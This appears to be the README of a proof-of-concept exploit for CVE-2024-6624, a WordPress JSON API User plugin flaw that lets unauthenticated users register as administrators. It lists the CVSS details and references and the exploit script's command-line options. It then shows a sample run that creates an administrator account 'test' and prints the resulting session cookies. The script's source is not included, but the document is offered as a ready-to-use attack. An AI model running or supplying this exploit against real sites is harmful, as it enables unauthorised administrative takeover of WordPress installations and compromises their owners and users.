# CVE-2024-6624
JSON API User &lt;= 3.9.3 - Unauthenticated Privilege Escalation

Description
---
The JSON API User plugin for WordPress is vulnerable to privilege escalation in all versions up to, and including, 3.9.3. This is due to improper controls on custom user meta fields. This makes it possible for unauthenticated attackers to register as administrators on the site. The plugin requires the JSON API plugin to also be installed.

```
State: PUBLISHED
Score: 9.8
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
Privileges: None
Attack Vector: None
References:
 - https://plugins.trac.wordpress.org/browser/json-api-user/trunk/controllers/User.php#L51
 - https://plugins.trac.wordpress.org/changeset/3115185/
 - https://plugins.trac.wordpress.org/browser/json-api-user/trunk/controllers/User.php#L187
```

How to use
---

```
usage: CVE-2024-6624.py [-h] -u URL [-un USERNAME] [-p PASSWORD]

WordPress User Management Script

options:
  -h, --help            show this help message and exit
  -u URL, --url URL     Website URL
  -un USERNAME, --username USERNAME
                        WordPress username
  -p PASSWORD, --password PASSWORD
                        WordPress password
```

POC
---

```
python3 CVE-2024-6624.py -u http://kubernetes.docker.internal -un test -p testest123
Registration Response:
{
    "status": "ok",
    "cookie": "test|1727176928|2KSZ0T0maNhdNfQwcwgqForXPZpfGXuC8XHaje57whM|e724bfd3ee1103a9ba8431cd357ca5cd5387f836f3cb3c761050bd4a0a0e7b56",
    "cookie_admin": "test|1727176928|tOXMV0zq3m368KcQzNaw5zbdGBoYYrrIByOAGWX6gdo|9b003b21babd93c4490fc6ace4b768c2201317957dd0f7c1766c142cfb5f2647",
    "cookie_name": "wordpress_logged_in_e2df32a6c3e7076dd7dc7d3f3fec39aa",
    "user_id": 41,
    "username": "test"
}
A new user with Administrator rights should of been now registered on http://kubernetes.docker.internal with the username test and password of testest123
```
